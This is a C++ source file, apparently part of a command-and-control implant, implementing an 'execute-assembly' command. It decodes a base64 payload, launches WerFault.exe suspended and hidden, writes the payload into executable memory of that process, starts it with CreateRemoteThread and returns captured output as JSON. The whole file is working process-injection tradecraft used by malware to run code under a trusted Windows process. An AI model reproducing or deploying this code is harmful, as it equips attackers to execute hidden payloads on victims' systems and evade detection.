#include "Command.h"

BYTE* Base64Decode(const char* input, DWORD* outLen);

BOOL CommandExecuteAssembly(json& args, string artifact, json& result) {
    HANDLE              hPipeRead;
    HANDLE              hPipeWrite;
    SECURITY_ATTRIBUTES sa;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA        si = { 0 };
    DWORD               size        = 0;
    PVOID               data        = NULL;
    PVOID               memory      = NULL;
    SIZE_T              written     = 0;
    HANDLE              hThread     = NULL;
    DWORD               total = 0;    
    DWORD               capacity = 4096;
    CHAR                temp[1024];
    DWORD               bytesread;


	data = Base64Decode(artifact.c_str(), &size);
	if (data == NULL) {
		return FALSE;
	}

    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;


    if (!CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
        printf("[-] CreatePipe failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    if (!SetHandleInformation(hPipeRead, HANDLE_FLAG_INHERIT, 0)) {
        printf("[-] SetHandleInformation failed: ( %d )\n", GetLastError());
        return FALSE;
    }

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.hStdError = hPipeWrite;
    si.hStdOutput = hPipeWrite;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    CHAR spawnto[] = "C:\\Windows\\System32\\WerFault.exe";
    if (!CreateProcessA(NULL, spawnto, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed: ( %d )\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        result["output"] = "failed to create spawnto process";
        return FALSE;
    }

    memory = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!memory) {
        result["output"] = "failed to allocate memory into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    // inject pic
    if (!WriteProcessMemory(pi.hProcess, memory, data, size, &written)) {
        result["output"] = "failed to write pic into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memory, NULL, 0, NULL);
    if (hThread == NULL) {
        result["output"] = "failed to create new thread into spawnto process";
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    CloseHandle(hPipeWrite);

    char* output = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, capacity);
    if (!output) {
        CloseHandle(hPipeRead);
        return FALSE;
    }
    output[0] = '\0';

    while (ReadFile(hPipeRead, temp, sizeof(temp) - 1, &bytesread, NULL) && bytesread > 0) {
        if (total + bytesread + 1 > capacity) {
            capacity *= 2;
            char* newOutput = (char*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, output, capacity);
            if (!newOutput) {
                HeapFree(GetProcessHeap(), 0, output);
                CloseHandle(hPipeRead);
                return FALSE;
            }
            output = newOutput;
        }

        memcpy(output + total, temp, bytesread);
        total += bytesread;
        output[total] = '\0';
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hPipeRead);
    
    result["output"] = output;    
    HeapFree(GetProcessHeap(), 0, output);

    return TRUE;
}